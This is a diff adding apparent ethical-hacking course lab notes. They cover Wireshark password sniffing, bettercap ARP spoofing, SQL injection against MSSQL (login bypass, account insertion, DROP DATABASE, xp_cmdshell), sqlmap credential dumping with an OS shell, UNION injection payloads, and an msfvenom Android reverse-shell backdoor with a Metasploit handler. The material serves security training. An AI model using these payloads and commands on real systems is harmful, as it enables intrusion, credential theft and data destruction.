@@ -2723,3 +2723,1033 @@ Task 5: Perform Cross-site Request Forgery (CSRF) Attack
  
 
     Link : https://bookshelf.vitalsource.com/reader/books/9798885931144/pageid/5489 
+
+
+
+# Sniffing
+
+#Sniff using wireshark
+
+TASK 1: PERFORM PASSWORD SNIFFING USING WIRESHARK  
+
+    Turn on the Windows 11 and Windows Server 2019 virtual machines.  
+
+    Win 19 : Wireshark > go to ethernet 
+
+    Wireshark starts capturing all packets generated while traffic is received by or sent from your machine. 
+
+    Windows 11 : login using admin 
+
+    Go to http://www.moviescope.com/ or amy link given 
+
+    Creds : sam , test 
+
+    Switch back to Windows Server 2019 virtual machine, and in the Wireshark window, click the Stop capturing packets icon on the toolbar. 
+
+    Save the file 
+
+    In the Apply a display filter field, type http.request.method == POST and click the arrow icon (→) to apply the filter. 
+
+    Note: Applying this syntax helps you narrow down the search for http POST traffic. 
+
+    Click Edit from the menu bar and click Find Packet....  
+
+    The Find Packet section appears below the display filter field. 
+
+    Click Display filter, select String from the drop-down options. Click Packet list, select Packet details from the drop-down options, and click Narrow & Wide and select Narrow (UTF-8 / ASCII) from the drop-down options. 
+
+    In the field next to String, type pwd and click the Find button. 
+
+    Wireshark will now display the sniffed password from the captured packets. 
+
+    Expand the HTML Form URL Encoded: application/x-www-form-urlencoded node from the packet details section, and view the captured username and password 
+
+
+
+# Session Hijacking
+
+#Detect Using wireshark
+
+TASK 1: DETECT SESSION HIJACKING USING WIRESHARK  
+
+    First we will attack to windows 11 from parrot 
+
+    Parrot : cd > root 
+
+    type bettercap -iface eth0 ( -iface: specifies the interface to bind to (here, eth0) 
+
+    Type net.probe on and press Enter 
+
+    Type net.recon on and press Enter 
+
+    Type net.sniff on and press Enter 
+
+    Win 11 : Open wireshark 
+
+    Switch back to the Windows 11 virtual machine and observe the huge number of ARP packets captured by the Wireshark, as shown in the screenshot. Note: bettercap sends several ARP broadcasts requests to the hosts (or potentially active hosts). A high number of ARP requests indicates that the system at 10.10.1.13 (the attacker’s system in this task) is acting as a client for all the IP addresses in the subnet, which means that all the packets from the victim node (in this case, 10.10.1.11) will first go to the host system (10.10.1.13), and then the gateway. Similarly, any packet destined for the victim node is first forwarded from the gateway to the host system, and then from the host system to the victim node. 
+
+    This is session hijacking 
+
+
+
+# SQL Injection
+
+#Perform sql injection attacks
+
+TASK 1: Perform an SQL Injection Attack on an MSSQL Database 
+
+    Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet). 
+
+    Here, we will use an SQL injection query to perform SQL injection attacks on an MSSQL database. 
+
+  
+
+    Open any web browser (here, Mozilla Firefox), place the cursor in the address bar, type http://www.goodshopping.com/, and press Enter. The GOOD SHOPPING home page loads. Assume that you are new to this site and have never registered with it; click LOGIN on the menu bar. 
+
+    In the Username field, type the query blah' or 1=1 -- as your login name, and leave the password field empty. Click the Log in button. 
+
+    You are now logged into the website with a fake login, even though your credentials are not valid. Now, you can browse all the site’s pages as a registered member. After browsing the site, click Logout from the top-right corner of the webpage.  
+
+    Now, we shall create a user account using the SQL injection query. Before proceeding with this sub-task, we shall first examine the login database of the GoodShopping website. 
+
+     Click Windows Server 2019 to switch to the Windows Server 2019 machine.  
+
+    In this task, we are logging into the Windows Server 2019 machine as a victim.  
+
+    Click the Type here to search icon in the lower section of Desktop and type microsoft. From the results, click Microsoft SQL Server Management Studio 18. 
+
+    In the left pane of the Microsoft SQL Server Management Studio window, under the Object Explorer section, expand the Databases node. From the available options, expand the GoodShopping node, and then the Tables node under it. 
+
+     Under the Tables node, right-click the dbo.Login file and click Select Top 1000 Rows from the context menu to view the available credentials. 
+
+    You can observe that the database contains only one entry with the username and password as smith and smith123, respectively. 
+
+    Click Windows 11 to switch back to the Windows 11 machine and go to the browser where the GoodShopping website is open. 
+
+  
+
+    Click LOGIN on the menu bar and type the query blah';insert into login values ('john','apple123'); -- in the Username field (as your login name) and leave the password field empty. Click the Log in button. 
+
+    If no error message is displayed, it means that you have successfully created your login using an SQL injection query. 
+
+    After executing the query, to verify whether your login has been created successfully, click the LOGIN tab, enter john in the Username field and apple123 in the Password field, and click Log in. 
+
+    You will log in successfully with the created login and be able to access all the features of the website. 
+
+    In the Save login for goodshopping.com? pop-up, click Don't Save. 
+
+    After browsing the required pages, click Logout from the top-right corner of the webpage 
+
+    Click Windows Server 2019 to switch back to the victim machine (Windows Server 2019 machine). 
+
+    In the Microsoft SQL Server Management Studio window, right-click dbo.Login, and click Select Top 1000 Rows from the context menu. 
+
+    You will observe that a new user entry has been added to the website’s login database file with the username and password as john and apple123, respectively. Note down the available databases. 
+
+    Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open. 
+
+    Click LOGIN on the menu bar and type the query blah';create database mydatabase; -- in the Username field (as your login name) and leave the password field empty. Click the Log in button. 
+
+     In the above query, mydatabase is the name of the database. 
+
+    If no error message (or any message) displays on the webpage, it means that the site is vulnerable to SQL injection and a database with the name mydatabase has been created on the database server. 
+
+    Click Windows Server 2019 to switch back to the Windows Server 2019 machine. 
+
+    In the Microsoft SQL Server Management Studio window, un-expand the Databases node and click the Disconnect icon ( 2022-04-20_14-43-14.png) and then click Connect Object Explorer icon ( 123dcdc.png) to connect to the database. In the Connect to Server pop-up, leave the default settings as they are and click the Connect button. 
+
+    Expand the Databases node. A new database has been created with the name mydatabase, as shown in the screenshot. 
+
+    Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open. 
+
+    Click LOGIN on the menu bar and type the query blah'; DROP DATABASE mydatabase; -- in the Username field; leave the Password field empty and click Log in. 
+
+    In the above query, you are deleting the database that you created in Step 25 (mydatabase). In the same way, you could also delete a table from the victim website database by typing blah'; DROP TABLE table_name; -- in the Username field. 
+
+ 
+
+    To see whether the query has successfully executed, Click Windows Server 2019 to switch back to the victim machine (Windows Server 2019); and in the Microsoft SQL Server Management Studio window, click the Refresh icon. 
+
+  
+
+    Expand Databases node in the left pane; you will observe that the database called mydatabase has been deleted from the list of available databases, as shown in the screenshot. 
+
+    In this case, we are deleting the same database that we created previously. However, in real-life attacks, if an attacker can determine the available database name and tables in the victim website, they can delete the database or tables by executing SQL injection queries. 
+
+  
+
+    Close the Microsoft SQL Server Management Studio window. 
+
+  
+
+    Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open. 
+
+  
+
+    Click LOGIN on the menu bar and type the query blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- in the Username field; leave the Password field empty and click Log in. 
+
+  
+
+    In the above query, you are pinging the www.certifiedhacker.com website using an SQL injection query. -l is the sent buffer size and -t refers to pinging the specific host. 
+
+   
+
+    The SQL injection query starts pinging the host, and the login page shows a Waiting for www.goodshopping.com… message at the bottom of the window. 
+
+  
+
+    To see whether the query has successfully executed, click Windows Server 2019 to switch back to the victim machine (Windows Server 2019). 
+
+  
+
+    Right-click the Start icon in the bottom-left corner of Desktop and from the options, click Task Manager. Click More details in the lower section of the Task Manager window. 
+
+  
+
+    Navigate to the Details tab and type p. You can observe a process called PING.EXE running in the background. 
+
+  
+
+    This process is the result of the SQL injection query that you entered in the login field of the target website. 
+
+   
+
+    To manually kill this process, click PING.EXE, and click the End task button in the bottom right of the window. 
+
+  
+
+    If a Task Manager pop-up appears, click End process. This stops or prevents the website from pinging the host. 
+
+  
+
+    This concludes the demonstration of how to perform SQL injection attacks on an MSSQL database. 
+
+ 
+
+#detection of SQL injection 
+
+    Task 1: Detect SQL Injection Vulnerabilities using DSSS 
+
+  
+
+    Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner that supports GET and POST parameters. DSSS scans web applications for various SQL injection vulnerabilities. 
+
+  
+
+    Here, we will use DSSS to detect SQL injection vulnerabilities in a web application. 
+
+  
+
+    We will scan the www.moviescope.com website that is hosted on the Windows Server 2019 machine. 
+
+  
+
+    On the Parrot Security machine, click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window. 
+
+  
+
+    A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user. 
+
+  
+
+    In the [sudo] password for attacker field, type toor as a password and press Enter. 
+
+  
+
+        The password that you type will not be visible. 
+
+  
+
+    In the MATE Terminal type cd DSSS and press Enter to navigate to the DSSS folder which is already downloaded. 
+
+  
+
+    In the terminal window, type python3 dsss.py and press Enter to view a list of available options in the DSSS application, as shown in the screenshot. 
+
+  
+
+    Now, minimize the Terminal window and click on the Firefox icon in the top section of Desktop to launch Firefox. 
+
+  
+
+    In the Mozilla Firefox window, type http://www.moviescope.com/ in the address bar and press Enter. A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button. 
+
+  
+
+        If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save. 
+
+  
+
+    Once you are logged into the website, click the View Profile tab from the menu bar; and when the page has loaded, make a note of the URL in the address bar of the browser. 
+
+  
+
+    Right-click anywhere on the webpage and click Inspect Element (Q) from the context menu, as shown in the screenshot. 
+
+  
+
+    The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter. 
+
+  
+
+    Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser. 
+
+  
+
+    Switch to a terminal window and type python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 11]" and press Enter. 
+
+  
+
+        In this command, -u specifies the target URL and --cookie specifies the HTTP cookie header value. 
+
+  
+
+    The above command causes DSSS to scan the target website for SQL injection vulnerabilities. 
+
+  
+
+    The result appears, showing that the target website (www.moviescope.com) is vulnerable to blind SQL injection attacks. The vulnerable link is also displayed, as shown in the screenshot. 
+
+  
+
+    Highlight the vulnerable website link, right-click it, and, from the options, click Copy. 
+
+  
+
+    Switch to Mozilla Firefox; in a new tab, paste the copied link in the address bar and press Enter. 
+
+  
+
+    You will observe that information regarding available user accounts appears under the View Profile tab. 
+
+  
+
+    Scroll down to view the user account information for all users. 
+
+  
+
+        In real life, attackers use blind SQL injection to access or destroy sensitive data. Attackers can steal data by asking a series of true or false questions through SQL statements. The results of the injection are not visible to the attacker. This type of attack can become time-intensive, because the database must generate a new statement for each newly recovered bit. 
+
+  
+
+ 
+ 
+
+ 
+
+ 
+
+Task 2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap 
+
+  
+
+    In this task, we will use sqlmap to perform SQL injection attack against MSSQL to extract databases. 
+
+  
+
+     In this task, you will pretend that you are a registered user on the http://www.moviescope.com website, and you want to crack the passwords of the other users from the website’s database. 
+
+  
+
+    Click Parrot Security to switch to the Parrot Security machine. 
+
+  
+
+    In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine. 
+
+  
+
+        If a Question pop-up window appears asking you to update the machine, click No to close the window. 
+
+    Click the Mozilla Firefox icon from the menu bar in the top-left corner of Desktop to launch the web browser. 
+
+  
+
+    Type http://www.moviescope.com/ and press Enter. A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button. 
+
+ 
+
+    If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save. 
+
+  
+
+    Once you are logged into the website, click the View Profile tab on the menu bar and, when the page has loaded, make a note of the URL in the address bar of the browser. 
+
+  
+
+    Right-click anywhere on the webpage and click Inspect Element (Q) from the context menu, as shown in the screenshot. 
+
+  
+
+    The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter. 
+
+  
+
+    Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser. 
+
+  
+
+    Click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window. 
+
+  
+
+    A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user. 
+
+  
+
+    In the [sudo] password for attacker field, type toor as a password and press Enter. 
+
+  
+
+  
+
+    In the Parrot Terminal window, type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs and press Enter. 
+
+  
+
+        In this query, -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases. 
+
+  
+
+    The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the MovieScope website. 
+
+  
+
+    If the message Do you want to skip test payloads specific for other DBMSes? [Y/n] appears, type Y and press Enter. 
+
+  
+
+    If the message for the remaining tests, do you want to include all tests for ‘Microsoft SQL Server’ extending provided level (1) and risk (1) values? [Y/n] appears, type Y and press Enter. 
+
+  
+
+  
+
+    sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, as shown in the screenshot. 
+
+  
+
+    Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with the database moviescope. 
+
+  
+
+    Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables and press Enter. 
+
+  
+
+        In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables. 
+
+  
+
+    The above query causes sqlmap to scan the moviescope database for tables located in the database. 
+
+  
+
+  
+
+    sqlmap retrieves the table contents of the moviescope database and displays them, as shown in screenshot. 
+
+  
+
+  
+
+    Now, you need to retrieve the table content of the column User_Login. 
+
+  
+
+    Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump and press Enter to dump all the User_Login table content. 
+
+  
+
+  
+
+    sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users’ usernames under the Uname column and passwords under the password column, as shown in screenshot. 
+
+  
+
+    You will see that under the password column, the passwords are shown in plain text form. 
+
+  
+
+  
+
+    To verify if the login details are valid, you should try to log in with the extracted login details of any of the users. To do so, switch back to the web browser, close the Developer Tools console, and click Logout to start a new session on the site. 
+
+  
+
+  
+
+    The Login page appears; log in into the website using the retrieved credentials john/qwerty. 
+
+  
+
+        If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save. 
+
+  
+
+  
+
+    You will observe that you have successfully logged into the MovieScope website with john’s account, as shown in the screenshot. 
+
+  
+
+  
+
+    Now, switch back to the Parrot Terminal window. Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell and press Enter. 
+
+  
+
+     In this query, --os-shell is the prompt for an interactive OS shell. 
+
+  
+
+  
+
+    If the message do you want sqlmap to try to optimize value(s) for DBMS delay responses appears, type Y and press Enter to continue. 
+
+  
+
+    Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running. 
+
+  
+
+    If the message do you want to retrieve the command standard output? appears, type Y and press Enter. 
+
+  
+
+  
+
+    sqlmap will retrieve the hostname of the machine on which the target web application is running, as shown in the screenshot. 
+
+  
+
+    Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system. 
+
+   
+
+    If the message do you want to retrieve the command standard output? appears, type Y and press Enter. 
+
+  
+
+    The above command retrieves the tasks and displays them under the command standard output section, as shown in the screenshots below. 
+
+   
+
+    Following the same process, you can use various other commands to obtain further detailed information about the target machine. 
+
+  
+
+    To view the available commands under the OS shell, type help and press Enter. 
+
+
+
+#sql injection
+
+    VULNERABLE QUERIES : 
+
+ 
+
+    RETRIEVE HIDDEN DATA :  
+
+    SQL backened code : SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+    Modified attack : SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 
+
+    '-- will comment out the rest of the portion 
+
+    Also similar attack : SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
+
+    https://insecure-website.com/products?category=Gifts'+OR+1=1-- 
+
+    1=1-- means TRUE  
+
+ 
+
+ 
+
+   SUBVERTING APPLICATION LOGIC 
+
+    SQL backened code : SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' 
+
+    Modified attack : SELECT * FROM users WHERE username = 'administrator'--' AND password = '' 
+
+    '-- will comment out the rest of the portion 
+
+ 
+
+ 
+
+SQL INJECTION UNION ATTACKS 
+
+    When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.  
+
+    The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:  
+
+    SQL code : SELECT a, b FROM table1 UNION SELECT c, d FROM table2  
+
+    This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.  
+
+    For a UNION query to work, two key requirements must be met:  
+
+    The individual queries must return the same number of columns.  
+
+    The data types in each column must be compatible between the individual queries.  
+
+    To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:  
+
+    How many columns are being returned from the original query.  
+
+    Which columns returned from the original query are of a suitable data type to hold the results from the injected  
+
+    query  
+
+ 
+
+ 
+
+Determining the number of columns required 
+
+    When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.  
+
+    One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For  
+
+    example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:  
+
+    ' ORDER BY 1-- 
+
+    ' ORDER BY 2-- 
+
+    ' ORDER BY 3-- etc.  
+
+    This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:  
+
+    The ORDER BY position number 3 is out of range of the number of items in the select list.  
+
+    The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect     some difference in the response, you can infer how many columns are being returned from the query.  
+
+ 
+
+ 
+
+Determining the number of columns required  
+
+    The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:  
+
+    ' UNION SELECT NULL-- 
+
+    ' UNION SELECT NULL,NULL-- 
+
+    ' UNION SELECT NULL,NULL,NULL-- 
+
+    etc.  
+
+    If the number of nulls does not match the number of columns, the database returns an error, such as: 
+
+    All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists. We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.  
+
+    As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of     columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.  
+
+ 
+
+ 
+
+Database-specific syntax 
+
+    On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:  
+
+    ' UNION SELECT NULL FROM DUAL--  
+
+    The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.  
+
+ 
+
+ 
+
+  Finding columns with a useful data type 
+
+    A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.  
+
+    After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:  
+
+    ' UNION SELECT 'a',NULL,NULL,NULL-- 
+
+    ' UNION SELECT NULL,'a',NULL,NULL-- 
+
+    ' UNION SELECT NULL,NULL,'a',NULL-- 
+
+    ' UNION SELECT NULL,NULL,NULL,'a'--  
+
+    If the column data type is not compatible with string data, the injected query will cause a database error, such as:  
+
+    Conversion failed when converting the varchar value 'a' to data type int.  
+
+    If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.  
+
+ 
+
+ 
+
+Using a SQL injection UNION attack to retrieve interesting data 
+
+    When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.  
+
+    Suppose that:  
+
+    The original query returns two columns, both of which can hold string data.  
+
+    The injection point is a quoted string within the WHERE clause.  
+
+    The database contains a table called users with the columns username and password.  
+
+    In this example, you can retrieve the contents of the users table by submitting the input:  
+
+    ' UNION SELECT username, password FROM users--  
+
+    In order to perform this attack, you need to know that there is a table called users with two columns called username and password. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.  
+
+ 
+
+ 
+
+Retrieving multiple values within a single column 
+
+    In some cases the query in the previous example may only return a single column.  
+
+    You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:  
+
+    ' UNION SELECT username || '~' || password FROM users--  
+
+    This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.  
+
+    The results from the query contain all the usernames and passwords, for example:  
+
+    ...administrator~s3cure 
+
+    wiener~peter 
+
+    carlos~montoya... Different databases use different syntax to perform string concatenation 
+
+ 
+
+#Important links
+
+    SQLMap complete guide : https://hackertarget.com/sqlmap-tutorial/ 
+
+ 
+
+    SQLMap THM walkthrough : https://medium.com/@wilklins/sqlmap-tryhackme-writeup-1b9f244ee599 
+
+
+
+# Hacking Mobile Platform
+
+#Hack android devices
+
+TASK 1 : Hack an Android Device by Creating Binary Payloads using Parrot Security 
+
+    Attackers use various tools such as Metasploit to create binary payloads, which are sent to the target system to gain control over it. The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. It contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. Meterpreter is a Metasploit attack payload that provides an interactive shell that can be used to explore target machines and execute code. 
+
+  
+
+    In this task, we will use Metasploit to create a binary payload in Parrot Security to hack an Android device. 
+
+  
+
+    Click Parrot Security to switch to the Parrot Security machine. 
+
+  
+
+    In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine. 
+
+  
+
+    If a Parrot Updater pop-up appears at the top-right corner of Desktop, ignore and close it. 
+
+  
+
+    If a Question pop-up window appears asking you to update the machine, click No to close the window. 
+
+  
+
+    Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window. 
+
+  
+
+    A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user. 
+
+  
+
+    In the [sudo] password for attacker field, type toor as a password and press Enter. 
+
+  
+
+    The password that you type will not be visible. 
+
+  
+
+    Now, type cd and press Enter to jump to the root directory. 
+
+  
+
+    In the Parrot Terminal window, type service postgresql start and press Enter to start the database service. 
+
+  
+
+    Type msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk and press Enter to generate a backdoor, or reverse meterpreter application. 
+
+  
+
+    This command creates an APK (Backdoor.apk) on Desktop under the Root directory. In this case, 10.10.1.13 is the IP address of the Parrot Security machine. 
+
+  
+
+    Now, share or send the Backdoor.apk file to the victim machine (in this lab, we are using the Android emulator as the victim machine). 
+
+  
+
+    In this task, we are sending the malicious payload through a shared directory, but in real-life cases, attackers may send it via an attachment in an email, over Bluetooth, or through some other application or means. 
+
+  
+
+    Execute the below commands to create a share folder and assign required permissions to it: 
+
+  
+
+    Type mkdir /var/www/html/share and press Enter to create a shared folder 
+
+    Type chmod -R 755 /var/www/html/share and press Enter 
+
+    Type chown -R www-data:www-data /var/www/html/share and press Enter 
+
+    Now, type service apache2 start and press Enter to start the Apache web server. 
+    
+  
+
+    Type cp /root/Desktop/Backdoor.apk /var/www/html/share/ and press Enter to copy the Backdoor.apk file to the location share folder. 
+
+  
+
+    Type msfconsole and press Enter to launch the Metasploit framework. 
+
+  
+
+    In msfconsole, type use exploit/multi/handler and press Enter. 
+
+  
+
+    Now, issue the following commands in msfconsole: 
+
+  
+
+    Type set payload android/meterpreter/reverse_tcp and press Enter. 
+
+    Type set LHOST 10.10.1.13 and press Enter. 
+
+    Type show options and press Enter. This command lets you know the listening port (in this case, 4444), as shown in the screenshot. 
+
+  
+
+    Type exploit -j -z and press Enter. This command runs the exploit as a background job. 
+
+  
+
+    Click Android to switch to the Android emulator machine. 
+
+  
+
+    If the Android machine is non-responsive then, click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine. 
+
+  
+
+    If Reset/Reboot machine pop-up appears, click Yes to proceed. 
+
+  
+
+    In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser 
+
+  
+
+    In the address bar, type http://10.10.1.13/share and press Enter. 
+
+  
+
+    If a Browse faster. Use less data. notification appears, click No thanks. 
+
+  
+
+    If a pop up appears, click Allow. 
+
+  
+
+    The Index of /share page appears; click Backdoor.apk to download the application package file. 
+
+  
+
+    After the download finishes, a notification appears at the bottom of the browser window. Click Open to open the application. 
+
+  
+
+    If Chrome needs storage access to download files, a pop-up will appear; click Continue. If any pop-up appears stating that the file contains a virus, ignore the message and download the file anyway. 
+
+  
+
+    In Allow Chrome to access photos, media, and files on your device?, click ALLOW. 
+
+  
+
+    If a warning message appears at the lower section of the browser window, click OK or Download anyway. 
+
+  
+
+    Chrome pop-up appears as shown in screenshot click on SETTINGS. 
+
+  
+
+    Install unknown apps screen appears, Now turn on Allow from this source and click back. 
+
+  
+
+    A MainActivity screen appears; click Install. 
+
+ 
+
+    After the application installs successfully, an App installed notification appears; click OPEN. 
+
+  
+
+    Blocked by play protect pop-up appears click INSTALL ANYAY 
+
+  
+
+    send app for scanning? pop-up appears click DON'T SEND 
+
+  
+
+    Click Parrot Security switch back to the Parrot Security machine. The meterpreter session has been opened successfully, as shown in the screenshot. 
+
+  
+
+    In this case, 10.10.1.14 is the IP address of the victim machine (Android Emulator). 
+
+  
+
+    Type sessions -i 1 and press Enter. The Meterpreter shell is launched as shown in the screenshot. 
+
+  
+
+    In this command, 1 specifies the number of the session. 
+
+  
+
+    Type sysinfo and press Enter. Issuing this command displays the information the target machine such as computer name, OS, etc. 
+
+  
+
+    Type ipconfig and press Enter to display the victim machine’s network interfaces, IP address (IPv4 and IPv6), MAC address, etc. as shown in the screenshot. 
+
+  
+
+    Type pwd and press Enter to view the current or present working directory on the remote (target) machine. 
+
+  
+
+    Type cd /sdcard to change the current remote directory to sdcard. 
+
+  
+
+    The cd command changes the current remote directory. 
+
+  
+
+    Now, type pwd and press Enter. You will observe that the present working directory has changed to sdcard, that is, /storage/emulated/0. 
+
+  
+
+    Now, still in the Meterpreter session, type ps and press Enter to view the processes running in the target system. 
+
+  
+
+    The list of running processes might differ in your lab environment. 
+
+  
+
+    Because of poor security settings and a lack of awareness, if an individual in an organization installs a backdoor file on their device, the attacker gains control of the device. The attacker can then perform malicious activities such as uploading worms, downloading data, and spying on the user’s keystrokes, which can reveal sensitive information related to the organization as well as the victim 
+
+  
+
+    Close all open windows. 
+
+  
+
+    Click Android to switch to the Android machine. 
+
+  
+
+    On the Home Screen, swipe up to navigate to the applications. 
+
+   
+
+    In the applications section, long click on MainActivity application and click App info. 
+
+   
+
+    App info page appears, click UNINSTALL button to uninstall the application. 
+
+  
+
+    If a pop-up appears, click OK. 
+
+  
+
+    This concludes the demonstration of how to hack an Android device by creating binary payloads using Parrot Security. 
+
+
+
+#securing android
+
+TASK 1 : Analyze a Malicious App using online android analyzers 
+
+  
+
+    1) Sisik - https://www.sisik.eu/apk-tool 
+
+    2) SandDroid (http://sanddroid.xjtu.edu.cn) 
+
+    3) Apktool (http://www.javadecompilers.com)  
+
+    4) X-Ray 2.0 (https://duo.com) 
+
+    5) Vulners Scanner (https://play.google.com) 
+
+    6) Shellshock Scanner - Zimperium (https://play.google.com)  
+
+    7) Yaazhini (https://www.vegabird.com) 
+    
+    8) Quick Android Review Kit (QARK) (https://github.com)  
+
+ 
+
+ 
+
+ 
+
+Task 2: Secure Android Devices from Malicious Apps using Malwarebytes Security 
+
+ 
+
+    Scan apps using malwarebytes app in play store 
+
+
+#Imp links
+
+    Android hacking Full Guide : https://github.com/Aftab700/CEH_Notes/blob/main/modules/Hacking_Mobile_Platforms.md 
+
+
+# IOT hacking
+#Imp links
+
+    LINK : https://bookshelf.vitalsource.com/reader/books/9798885931144/pageid/5708 
+
+    Guide : https://github.com/Aftab700/CEH_Notes/blob/main/modules/IoT_and_OT_Hacking.md 
+
+ 
